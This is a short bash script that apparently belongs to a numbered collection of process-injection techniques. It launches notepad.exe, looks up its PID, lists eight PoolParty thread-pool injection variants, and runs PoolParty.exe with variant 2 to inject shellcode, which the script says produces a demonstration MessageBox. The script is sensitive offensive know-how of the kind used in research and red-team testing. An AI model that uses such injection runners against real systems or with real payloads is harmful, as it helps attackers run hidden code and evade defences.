#!/bin/bash

echo "[*] PoolParty (Technique 37) - Process Injection via Thread Pool"
echo ""

# 启动notepad
echo "[*] Starting notepad.exe..."
notepad.exe &
sleep 2

# 获取PID
PID=$(tasklist | grep -i "notepad.exe" | tail -1 | awk '{print $2}')

if [ -z "$PID" ]; then
    echo "[x] Failed to find notepad.exe"
    exit 1
fi

echo "[+] Found notepad.exe with PID: $PID"
echo ""

# 显示可用的PoolParty变体
echo "[*] Available PoolParty variants:"
echo "    1: WorkerFactoryStartRoutineOverwrite"
echo "    2: RemoteTpWorkInsertion"
echo "    3: RemoteTpWaitInsertion"
echo "    4: RemoteTpIoInsertion"
echo "    5: RemoteTpAlpcInsertion"
echo "    6: RemoteTpJobInsertion"
echo "    7: RemoteTpDirectInsertion"
echo "    8: RemoteTpTimerInsertion"
echo ""

# 使用变体2 (RemoteTpWorkInsertion)
echo "[*] Using variant 2 (RemoteTpWorkInsertion)..."
echo ""

./PoolParty.exe -V 2 -P $PID

echo ""
echo "[!] Interact with notepad.exe to trigger the shellcode"
echo "[!] Expected: MessageBox popup from notepad.exe"
